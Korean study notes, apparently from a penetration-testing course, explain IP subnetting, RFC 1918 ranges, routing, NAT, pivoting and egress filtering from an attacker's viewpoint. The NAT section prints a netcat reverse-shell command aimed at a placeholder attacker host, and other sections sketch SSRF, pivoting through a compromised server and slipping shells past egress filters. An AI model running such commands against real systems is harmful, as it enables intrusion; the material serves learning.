# 04_IP_Routing_NAT

네트워크 간의 데이터 이동 경로를 결정하는 라우팅(Routing)과, 부족한 IP 주소 문제를 해결하는 NAT 기술을 다룬다.
해커에게는 **"사설망(Private Network) 내부에 숨겨진 타겟에 어떻게 도달할 것인가?"**에 대한 해답이 된다.

---

## 1. IP Addressing & Subnetting (Attack Scope)

CIDR(Classless Inter-Domain Routing) 표기법을 이해해야 공격 범위(Scope)를 산정할 수 있다.

### Subnet Mask & CIDR
* **Prefix Length (`/24`):** 네트워크 ID의 비트 수.
* **Security Context:**
    * **Network Scanning:** 공격 대상을 선정할 때, 타겟이 속한 네트워크 대역 전체를 스캔할지 결정한다.
    * `/24` (256개 IP): 금방 스캔함.
    * `/16` (65,536개 IP): 스캔에 시간이 오래 걸리고, 보안 장비에 탐지될 확률(Noise)이 높음.

### RFC 1918 (Private IP Address)
인터넷에서 라우팅되지 않는 사설 IP 대역. 해킹 중 이 IP가 보인다면 **"내부망(Intranet)"**임을 의미한다.

| Class | IP Range | 설명 |
| :--- | :--- | :--- |
| **A** | `10.0.0.0` ~ `10.255.255.255` | 대규모 기업망, 클라우드 내부망(AWS VPC 등). |
| **B** | `172.16.0.0` ~ `172.31.255.255` | 도커(Docker), VM 내부망에서 자주 사용. |
| **C** | `192.168.0.0` ~ `192.168.255.255` | **[Home Lab]** 일반 가정용 공유기 기본 대역. |

> **💡 Practical Tip:** 만약 모의해킹 중 웹 소스코드에서 `192.168.x.x` 주소가 하드코딩된 것을 발견했다면? 외부에서는 접속 불가능하지만, **SSRF(Server-Side Request Forgery)** 취약점을 이용해 웹 서버가 대신 접속하게 만들 수 있다.

---

## 2. Routing Mechanics (The Path)

패킷이 목적지까지 가는 길을 찾는 과정.

### Routing Table
* 라우터(혹은 PC)는 자신이 모르는 목적지로 가는 패킷을 받으면 **기본 게이트웨이(Default Gateway)**로 토스한다. (`0.0.0.0/0`)
* **Traceroute 원리:**
    * 패킷의 TTL(Time To Live)을 1부터 1씩 증가시키며 보낸다.
    * 각 라우터 구간마다 "TTL 만료(Time Exceeded)" 에러를 반환받으며 경로를 지도처럼 그린다.
    * **Attack Use:** 타겟 서버 앞단에 어떤 보안 장비(방화벽, 로드밸런서)가 있는지 네트워크 토폴로지를 파악할 때 사용.

---

## 3. NAT (Network Address Translation)

**[Home Lab & Reverse Shell Essential]**
사설 IP를 공인(Public) IP로 변환하는 기술. 공유기가 수행하는 핵심 기능.



### 1) SNAT (Source NAT) - "나가는 것"
* **동작:** 내부(사설 IP)에서 외부(인터넷)로 나갈 때, 출발지 IP를 공유기의 **공인 IP**로 바꿔치기한다.
* **보안 관점:** 공격 대상 서버의 로그에는 실제 공격자의 PC IP가 아닌, 공격자가 속한 망의 **라우터 IP**만 남는다. (추적의 어려움)

### 2) DNAT (Destination NAT) & Port Forwarding - "들어오는 것"
* **문제:** 외부(인터넷)에서는 내부 사설 IP(`192.168.0.50`)로 직접 접속할 수 없다.
* **해결 (포트 포워딩):** "공유기의 8080포트로 들어오는 신호는 내 라즈베리파이(192.168.0.50)의 80번 포트로 보내줘."라고 설정.
* **Hackers Use Case (Reverse Shell):**
    * 피해자 PC(Victim)가 내 PC(Attacker)로 연결을 맺게 하려면(`nc -e /bin/sh attacker_ip 4444`), 내 PC가 공유기 뒤에 숨어있으면 안 된다.
    * 따라서 **공유기에서 포트 포워딩**을 해주거나, **VPS(AWS, Cloudflare 등)**를 사용하여 공인 IP를 확보해야 쉘을 받을 수 있다.

---

## 4. Pivoting (Lateral Movement)

**[Advanced]** 해커가 방화벽을 우회하여 깊숙한 내부망으로 들어가는 기술. 라우팅을 이용한다.

* **시나리오:**
    1.  공격자가 외부에 노출된 **웹 서버(Public IP)**를 해킹했다.
    2.  하지만 진짜 목표인 **DB 서버(Private IP only)**는 인터넷과 단절되어 있다.
    3.  웹 서버는 DB 서버와 연결되어 있다(Dual Homed).
* **기법 (Tunneling/Proxy):**
    * 이미 장악한 웹 서버를 **라우터(Proxy)**처럼 사용한다.
    * 내 공격 PC의 라우팅 테이블을 조작하여, DB 서버로 가는 패킷을 웹 서버가 대신 전달하게 만든다. (`SOCKS Proxy`, `SSH Tunneling`, `Chisel` 등 사용)

---

## 5. Bogon IP & Egress Filtering

보안 장비가 IP 주소를 기반으로 차단하는 방법.

* **Bogon IP:** 인터넷에 돌아다니면 안 되는 IP들 (사설 IP `10.x`, `192.168.x`, 루프백 `127.x`).
* **Ingress Filtering:** 외부에서 들어오는 패킷 중 소스 IP가 내부 IP 대역인 경우 차단 (IP Spoofing 방지).
* **Egress Filtering:** **[중요]** 내부에서 외부로 나가는 통신을 차단.
    * 리버스 쉘을 막기 위해, 서버에서 외부로 나가는 모든 포트(Outbound)를 막고 **DNS(53), HTTP(80)** 등 필수 포트만 열어두는 경우가 많다.
    * 해커는 이를 우회하기 위해 **잘 알려진 포트(Well-known Port)**를 사용하여 쉘 연결을 시도한다.
